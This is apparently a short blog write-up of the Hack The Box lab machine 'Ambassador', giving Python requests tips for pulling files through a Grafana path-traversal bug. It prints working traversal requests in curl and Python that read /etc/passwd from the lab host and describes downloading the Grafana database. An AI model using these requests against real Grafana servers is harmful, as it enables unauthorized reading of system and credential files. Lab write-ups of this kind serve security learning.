+++
author = "Frenchie"
title = "Ambassador HTB"
date = "2023-01-29"
description = "Ambassador HTB"
tags = [
    "Gaming",
    "Hacking",
]
showthedate = false
+++

While doing manual LFI at grafana endpoint, I tried to exfill sqlite3 db from /var/lib/grafana/grafana.db

<!--more-->

The initial code:
```python
if r.status_code == 200:
    print(r.text)
```

Using r.text from requests library caused sqlite3 db became corrupted.
Need to use proper method.
```python
if r.status_code == 200:
    with open("grafana-python.db", "wb") as file:
        file.write(r.content)
```

> Use requests.content instead of requests.text for bytes-type data.
> [Docs](https://requests.readthedocs.io/en/latest/user/quickstart/#binary-response-content)

### Encodings
When you receive a response, Requests makes a guess at the encoding to use for decoding the response when you access the Response.text attribute. Requests will first check for an encoding in the HTTP header, and if none is present, will use charset_normalizer or chardet to attempt to guess the encoding.

If chardet is installed, requests uses it, however for python3 chardet is no longer a mandatory dependency. The chardet library is an LGPL-licenced dependency and some users of requests cannot depend on mandatory LGPL-licensed dependencies.

When you install requests without specifying [use_chardet_on_py3] extra, and chardet is not already installed, requests uses charset-normalizer (MIT-licensed) to guess the encoding.

The only time Requests will not guess the encoding is if no explicit charset is present in the HTTP headers and the Content-Type header contains text. In this situation, RFC 2616 specifies that the default charset must be ISO-8859-1. Requests follows the specification in this case. If you require a different encoding, you can manually set the Response.encoding property, or use the raw Response.content.

---

For sending GET requests without url normalization, use curl with `--path-as-is`

```text
curl --path-as-is http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd -x 127.0.0.1:8080
```

With requests module in python3, using requests.get will not work. Need to use prepared requests.
[Docs](https://requests.readthedocs.io/en/latest/user/advanced/#prepared-requests)

```python
import requests

url = 'http://10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd'
proxies = {"http": "127.0.0.1:8080"}
s = requests.Session()
req = requests.Request(method='GET', url=url)
prep = req.prepare()
prep.url = url
r = s.send(prep, verify=False, timeout=3)
# r = s.send(prep, verify=False, timeout=3, proxies=proxies)  # WILL NOT WORK WITH PROXIES
print(r.text)
```

> CANNOT using proxies in prepared requests. The url will get normalized!

---

Curl can work without specifying protocol scheme.
```bash
curl 10.10.11.183:3000/public/plugins/stat/../../../../../../../../etc/passwd --path-as-is
```

in Python3, without protocol scheme (http/https) requests will error: No connection adapters were found.

> Without the http:// part, requests has no idea how to connect to the remote server.
>
>Note that the protocol scheme must be all lowercase; if your URL starts with HTTP:// for example, it won’t find the http:// connection adapter either.
> — <cite>[source](https://stackoverflow.com/questions/15115328/python-requests-no-connection-adapters)</cite>

> Remember typing http!